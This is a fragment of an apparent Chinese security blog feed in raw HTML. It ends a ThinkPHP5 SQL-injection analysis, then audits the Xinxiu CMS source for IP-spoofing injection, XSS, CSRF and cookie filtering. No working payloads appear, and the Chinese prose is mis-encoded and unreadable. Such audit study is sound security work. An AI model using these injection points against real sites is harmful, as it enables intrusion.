class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>parseFieid</code>æ–¹æ³•ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// æ”¯æŒ &#x27;field1&#x27;=&gt;&#x27;field2&#x27; è¿™æ ·çš„å­—æ®µåˆ«åå®šä¹‰</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æœªåšä»»ä½•è¿‡æ»¤ï¼Œç”¨æˆ·å¯æ§æ•°æ®åªæ˜¯ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†ï¼Œå¹¶ä¸å½±å“æ•°æ®ï¼Œç„¶åç›´æ¥ç”¨é€—å·æ‹¼æ¥ï¼Œæœ€ç»ˆç›´æ¥æ›¿æ¢è¿› <strong>SQL</strong> è¯­å¥æ¨¡æ¿é‡Œï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„å‘ç”Ÿ</p><h2 id="åˆ©ç”¨æ€»ç»“-5"><a href="#åˆ©ç”¨æ€»ç»“-5" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤-5"><a href="#æ¼æ´ä¿®å¤-5" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå½“åŒ¹é…åˆ°é™¤äº† <strong>å­—æ¯ã€ç‚¹å·ã€æ˜Ÿå·</strong> ä»¥å¤–çš„å­—ç¬¦æ—¶ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç¯å¢ƒå‡†å¤‡ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQLæ³¨å…¥" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿä»£ç å®¡è®¡å­¦ä¹ (å¤ç°)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHPä»£ç å®¡è®¡åˆæ¬¡å°è¯•ä¹‹æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿ</a></p><p>å®¡è®¡æ€è·¯é€šè¿‡è„‘å›¾å¤§æ¦‚æ€»ç»“å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="äº†è§£ç³»ç»Ÿ"><a href="#äº†è§£ç³»ç»Ÿ" class="headerlink" title="äº†è§£ç³»ç»Ÿ"></a>äº†è§£ç³»ç»Ÿ</h1><p><strong>CMSåç§°</strong>ï¼šæ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»ŸPHPç‰ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>çœ‹ç€ç•Œé¢å°±çŸ¥é“æ˜¯ç”¨äºä¼ä¸šæ‰“å¹¿å‘Š(x)å’Œå‘å¸ƒä¿¡æ¯ï¼Œæ‹›è˜ç­‰åŠŸèƒ½çš„ç³»ç»Ÿã€‚ä¸”å­˜åœ¨å‰å°ç”¨æˆ·ç™»å½•å’Œåå°ç®¡ç†ç³»ç»Ÿã€‚å­˜åœ¨æœç´¢åŠŸèƒ½ã€‚</p><h1 id="é˜²æŠ¤ç­–ç•¥"><a href="#é˜²æŠ¤ç­–ç•¥" class="headerlink" title="é˜²æŠ¤ç­–ç•¥"></a>é˜²æŠ¤ç­–ç•¥</h1><h2 id="IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"><a href="#IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥" class="headerlink" title="IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"></a>IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥</h2><p>é™åˆ¶äº†å‰å°ã€åå°çš„ç™»å½•æ¬¡æ•°é™åˆ¶ã€æ³¨å†Œé™åˆ¶ã€å¯èƒ½ä¼šå½±å“åˆ°åé¢SQLæ³¨å…¥æ¼æ´çš„æµ‹è¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>å¯èƒ½å‡ºç°çš„æ¼æ´ï¼š<strong>ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ”»å‡»</strong></p><p>æ•°æ®åº“ç›‘æ§ï¼Œåœ¨æ³¨å†Œçš„åœ°æ–¹çœ‹çœ‹<code>ip</code> æ˜¯å¦è¢«å¸¦å…¥äº†æ•°æ®åº“ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>å…¨å±€å®šä½åˆ°è·å–ç”¨æˆ·iPçš„ä»£ç éƒ¨åˆ†ï¼š</p><p>phpstorm æœç´¢ è·å–IPï¼Œå³å¯ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å®¢æˆ·ç«¯IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œå½“ip é™¤å»<code>.</code>  åï¼Œå¦‚æœä¸æ˜¯çº¯æ•°å­—ï¼Œé‚£ä¹ˆå°±è®¾ç½®ä¸º 0.0.0.0 ã€‚å› æ­¤é€šè¿‡ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ˜¯è¡Œä¸é€šäº†ã€‚</p><h2 id="XSS-è¿‡æ»¤"><a href="#XSS-è¿‡æ»¤" class="headerlink" title="XSS è¿‡æ»¤"></a>XSS è¿‡æ»¤</h2><p>å‰å°å­˜åœ¨ç•™è¨€åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>æäº¤åï¼Œæˆ‘ä»¬ç™»å½•åå°ç®¡ç†å‘˜è¿›è¡ŒæŸ¥çœ‹ç•™è¨€å†…å®¹ã€‚ å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œjsä»£ç ã€‚</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;æ‚¨çš„ç½‘ç«™æœ‰äº†æ–°çš„ç•™è¨€&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„è¾“å…¥æ˜¯è¢«ä¼ å…¥äº†<code>post</code> å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œè·Ÿè¿›è¯¥å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡äº†<code>strict</code> æ¡ä»¶çš„è¿‡æ»¤å‡½æ•°ï¼Œæ‰¾åˆ°è¿™ä¸ªçš„å®šä¹‰å¤„ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸¥æ ¼è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„å±é™©ç¬¦å·</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°html çš„é—­åˆæ ‡ç­¾è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥æ²¡æ³•XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œéœ€è¦æ—§å¯†ç ï¼Œè¡Œä¸é€šã€‚</p><h2 id="å¯æ§å˜é‡è¿‡æ»¤"><a href="#å¯æ§å˜é‡è¿‡æ»¤" class="headerlink" title="å¯æ§å˜é‡è¿‡æ»¤"></a>å¯æ§å˜é‡è¿‡æ»¤</h2><h3 id="session-è¿‡æ»¤"><a href="#session-è¿‡æ»¤" class="headerlink" title="session è¿‡æ»¤"></a>session è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-è¿‡æ»¤"><a href="#cookie-è¿‡æ»¤" class="headerlink" title="cookie è¿‡æ»¤"></a>cookie è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-ç™»å½•"><a href="#admin-ç™»å½•" class="headerlink" title="admin ç™»å½•"></a>admin ç™»å½•</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;å¯¹ä¸èµ·ï¼Œç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;è¿”å›é‡æ–°ç™»å½•&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     â€¦â€¦</span><br></pre></td></tr></table></figure><h3 id="user-ç™»å½•"><a href="#user-ç™»å½•" class="headerlink" title="user ç™»å½•"></a>user ç™»å½•</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td 